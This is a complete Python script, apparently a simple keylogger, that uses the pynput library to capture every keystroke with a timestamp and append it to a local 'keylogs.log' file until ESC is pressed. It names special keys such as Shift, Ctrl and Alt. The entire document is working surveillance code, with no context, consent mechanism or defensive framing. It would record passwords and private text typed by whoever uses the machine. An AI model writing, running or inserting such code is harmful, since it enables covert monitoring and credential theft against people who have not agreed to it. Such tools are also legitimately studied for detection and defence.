#!/usr/bin/python
from pynput import keyboard
import os
from datetime import datetime

# Specify the path for the log file
log_file_path = os.path.join(os.getcwd(), "keylogs.log")

# Dictionary to map special keys to user-friendly names
key_names = {
    keyboard.Key.space: "[SPACE]",
    keyboard.Key.enter: "[ENTER]",
    keyboard.Key.tab: "[TAB]",
    keyboard.Key.backspace: "[BACKSPACE]",
    keyboard.Key.delete: "[DELETE]",
    keyboard.Key.left: "[LEFT ARROW]",
    keyboard.Key.right: "[RIGHT ARROW]",
    keyboard.Key.up: "[UP ARROW]",
    keyboard.Key.down: "[DOWN ARROW]",
    keyboard.Key.esc: "[ESC]",
    keyboard.Key.cmd: "[WINDOWS]",
    keyboard.Key.caps_lock: "[CAPS_LOCK]",
    keyboard.Key.shift_l: "[LEFT_SHIFT]",
    keyboard.Key.shift_r: "[RIGHT_SHIFT]",
    keyboard.Key.ctrl_l: "[LEFT_CTRL]",
    keyboard.Key.ctrl_r: "[RIGHT_CTRL]",
    keyboard.Key.alt_l: "[LEFT_ALT]",
    keyboard.Key.alt_r: "[RIGHT_ALT]",
}

def write_log(entry):
    # Write to the log file immediately
    with open(log_file_path, 'a') as log_file:
        log_file.write(entry + "\n")

def process_keys(key):
    timestamp = datetime.now().strftime('%d-%m-%y %H:%M:%S')  # Get the current timestamp
    if hasattr(key, 'char') and key.char is not None:
        # Log the character
        write_log(f"{timestamp} - {key.char}")
    else:
        # Log the special key
        special_key_entry = key_names.get(key, str(key))
        write_log(f"{timestamp} - {special_key_entry}")

def on_press(key):
    if key == keyboard.Key.esc:
        # Stop the listener if the ESC key is pressed
        return False  # Stop listener
    process_keys(key)

def start():
    # Start the key listener
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    start()
